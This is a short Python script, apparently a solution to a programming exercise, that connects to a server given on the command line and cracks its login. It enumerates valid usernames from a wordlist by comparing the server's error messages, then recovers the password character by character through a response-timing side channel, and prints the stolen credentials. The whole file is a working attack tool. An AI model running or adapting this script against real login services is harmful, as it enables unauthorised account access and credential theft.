import socket
import sys
import string
import json
from datetime import datetime


"""Program establish connection with server and tries to
crack login and password.
"""


def connection(apass, alog):
    """Pass login and password to server.

    Get response from server and calculate time of response.

    Return response and time of response.
    """
    log_pass = {"login": alog, "password": apass}
    log_pass_json = json.dumps(log_pass, indent=2)
    log_pass_json = log_pass_json.encode()
    my_socket.send(log_pass_json)
    start = datetime.now()
    resp_json = my_socket.recv(1024)
    resp_json = resp_json.decode()
    finish = datetime.now()
    difference = (finish - start).microseconds
    resp = json.loads(resp_json)
    return resp, difference


args = sys.argv
with socket.socket() as my_socket:
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    my_socket.connect(address)  # Establishing connection.

    hacking = []  # List of logins.
    file = open('logins.txt', 'r')
    for line in file:
        hacking.append(line.strip())
    file.close()

    check = True
    password = " "
    while check:
        for login_check in hacking:
            # Checking if login_check is searched login.
            response = connection(password, login_check)
            if response[0] == {'result': 'Wrong password!'}:
                login = login_check
                check = False
                break
            elif response[0] == {'result': 'Wrong login!'}:
                pass

    pass_bank = string.ascii_letters + string.digits  # All characters.
    check = True
    password = ""

    while check:
        for letter in pass_bank:
            # Checking if password is correct.
            password += letter
            response = connection(password, login)
            if response[0] == {'result': 'Connection success!'}:
                check = False
                break
            if response[1] < 90000:
                password = password[:-1]
                pass
            elif response[1] >= 90000:
                pass

    data = {"login": login, "password": password}
    data_json = json.dumps(data)
    print(data_json)